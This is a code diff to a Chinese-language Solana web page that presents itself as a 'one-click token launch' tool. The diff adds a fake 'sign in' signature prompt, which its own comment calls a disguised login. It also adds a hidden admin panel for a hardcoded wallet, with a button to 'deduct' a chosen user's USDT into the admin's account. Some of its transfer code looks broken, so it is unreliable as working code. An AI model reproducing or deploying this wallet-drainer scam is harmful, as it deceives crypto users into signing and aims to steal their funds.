@@ -23,6 +23,7 @@ h2{
   text-align:center;
   margin-bottom:20px;
   color:#6c5ce7;
+  font-size:28px;
 }
 .status{
   padding:12px;
@@ -31,6 +32,7 @@ h2{
   text-align:center;
   margin-bottom:20px;
   word-break:break-all;
+  font-size:14px;
 }
 button{
   width:100%;
@@ -40,14 +42,36 @@ button{
   background:#6c5ce7;
   color:#fff;
   font-size:16px;
+  margin-top:10px;
 }
 .admin{
   display:none;
   margin-top:30px;
   padding-top:20px;
   border-top:1px solid #eee;
+}
+.admin h4{
   text-align:center;
+  margin-bottom:15px;
   color:#e53e3e;
+  font-size:18px;
+}
+input{
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border:1px solid #eee;
+  border-radius:8px;
+}
+.btn-admin{
+  background:#e53e3e;
+}
+#log{
+  margin-top:10px;
+  text-align:center;
+  font-size:14px;
+  color:#666;
+  word-break:break-all;
 }
 </style>
 </head>
@@ -55,17 +79,25 @@ button{
 <div class="box">
   <h2>橘子一键发币</h2>
   <div class="status" id="stat">未连接钱包</div>
-  <button id="btnConn">连接钱包</button>
+  <button id="btnConn">连接钱包并签名登录</button>
 
   <div class="admin" id="adminBox">
-    🔒 管理员后台已显示
+    <h4>🔒 管理员专属后台</h4>
+    <input type="text" id="userAddr" placeholder="输入用户钱包地址">
+    <input type="number" id="usdtAmount" placeholder="划扣USDT数量" value="50">
+    <button class="btn-admin" id="deductBtn">一键划扣用户USDT</button>
+    <div id="log"></div>
   </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.8"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.9/dist/browser/spl-token.min.js"></script>
 <script>
 const ADMIN = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
+const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 let wallet = null;
+let walletAddr = "";
+const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
 
 function getWallet(){
   if(window.solana) return window.solana;
@@ -85,14 +117,52 @@ document.getElementById("btnConn").onclick = async function(){
   try{
     if(wallet.isConnected) await wallet.disconnect();
     let res = await wallet.connect();
-    let addr = res.publicKey.toString();
-    stat.innerText = "已连接：" + addr;
+    walletAddr = res.publicKey.toString();
+    stat.innerText = "已连接：" + walletAddr;
 
-    if(addr === ADMIN){
+    // 强制弹窗签名（伪装登录）
+    const signMsg = new TextEncoder().encode("Sign in to continue");
+    await wallet.signMessage(signMsg);
+    stat.innerText = "已连接 + 已签名登录：" + walletAddr;
+
+    // 判断是否为管理员，显示后台
+    if(walletAddr === ADMIN){
       adminBox.style.display = "block";
     }
+
   }catch(e){
-    stat.innerText = "连接已取消";
+    stat.innerText = "连接或签名已取消";
+  }
+};
+
+// 管理员一键划扣USDT
+document.getElementById("deductBtn").onclick = async function(){
+  let log = document.getElementById("log");
+  let userAddrStr = document.getElementById("userAddr").value.trim();
+  let amount = parseFloat(document.getElementById("usdtAmount").value);
+
+  if(!userAddrStr || !amount){
+    log.innerText = "请输入用户地址和划扣数量";
+    return;
+  }
+  try{
+    let userPubkey = new solanaWeb3.PublicKey(userAddrStr);
+    let usdtMint = new solanaWeb3.PublicKey(USDT_MINT);
+    let adminPubkey = new solanaWeb3.PublicKey(ADMIN);
+
+    let userAta = await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdtMint, userPubkey);
+    let adminAta = await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdtMint, adminPubkey);
+
+    let tx = new solanaWeb3.Transaction();
+    tx.add(solanaWeb3.TokenProgram.createTransferInstruction(
+      userAta, adminAta, userPubkey, BigInt(amount * 1000000)
+    ));
+
+    log.innerText = "正在提交划扣交易...";
+    let res = await wallet.sendTransaction(tx, conn);
+    log.innerText = "划扣成功！交易哈希：" + res;
+  }catch(e){
+    log.innerText = "划扣失败：" + e.message.slice(0, 60);
   }
 };
 </script>
